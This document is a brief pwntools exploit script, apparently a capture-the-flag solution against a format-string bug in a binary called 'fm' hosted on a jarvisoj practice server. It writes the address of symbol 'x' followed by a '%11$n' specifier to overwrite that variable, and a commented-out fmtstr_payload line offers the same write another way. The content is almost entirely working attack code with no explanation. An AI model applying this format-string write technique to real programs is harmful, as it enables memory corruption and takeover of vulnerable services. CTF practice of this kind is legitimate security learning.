#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./fm"

if sys.argv[1] == "l":
    io = process("./fm")
else:
    io = remote("pwn2.jarvisoj.com", 9895)

if __name__ == "__main__":
    payload = p32(ELF("./fm").sym['x']) + "%11$n"
    #  payload = fmtstr_payload(11, {ELF("./fm").sym['x']: 4})
    io.sendline(payload)

    io.interactive()
